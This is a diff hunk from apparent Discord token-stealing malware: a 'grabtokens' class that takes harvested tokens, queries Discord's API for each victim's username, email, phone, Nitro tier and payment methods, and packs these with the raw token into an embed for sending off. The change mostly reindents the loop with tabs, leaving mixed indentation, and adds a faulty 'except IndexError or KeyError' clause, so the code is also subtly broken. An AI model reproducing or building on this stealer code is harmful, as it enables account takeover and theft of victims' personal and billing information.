@@ -205,37 +205,37 @@ class grabtokens():
                                     self.tokens.append(token)
 
         for token in self.tokens:
-            r = requests.get(
-                'https://discord.com/api/v9/users/@me',
-                headers={"Authorization": token})
+			r = requests.get(
+				'https://discord.com/api/v9/users/@me',
+				headers={"Authorization": token})
+				
+			username = r.json()['username'] + '#' + r.json()['discriminator']
+			uid = r.json()['id']
+			phone = r.json()['phone']
+			email = r.json()['email']
+			
+			try:
+				if r.json()['premium_type'] == 1:
+					nitro = 'Nitro Classic'
+				elif r.json()['premium_type'] == 2:
+					nitro = 'Nitro Boost'
+			except IndexError or KeyError:
+				nitro = 'None'
 
-            username = r.json()['username'] + '#' + r.json()['discriminator']
-            uid = r.json()['id']
-            phone = r.json()['phone']
-            email = r.json()['email']
-
-            try:
-                if r.json()['premium_type'] == 1:
-                    nitro = 'Nitro Classic'
-                elif r.json()['premium_type'] == 2:
-                    nitro = 'Nitro Boost'
-            except IndexError:
-                nitro = 'None'
-
-            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",
-                             headers=self.getheaders(token))
-
-            if b.json() == []:
-                methods = "None"
-            else:
-                methods = ""
-                for method in b.json():
-                    if method['type'] == 1:
-                        methods += "💳"
-                    elif method['type'] == 0:
-                        methods += "<:paypal:973417655627288666>"
-                    else:
-                        methods += "❓"
+			b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", 
+							headers=self.getheaders(token))
+			
+			if b.json() == []:
+				methods = "None"
+			else:
+				methods = ""
+				for method in b.json():
+					if method['type'] == 1:
+						methods += "💳"
+					elif method['type'] == 0:
+						methods += "<:paypal:973417655627288666>"
+					else:
+						methods += "❓"
 
             embed.add_field(name="DISCORD INFO", value=f"```Discord Username: {username} \nDiscord ID: {uid}\nEmail: {email}\n\nPhone: {phone}\nNitro: {nitro}\nBilling: {methods}\n\nToken:{token}```", inline=False)
 
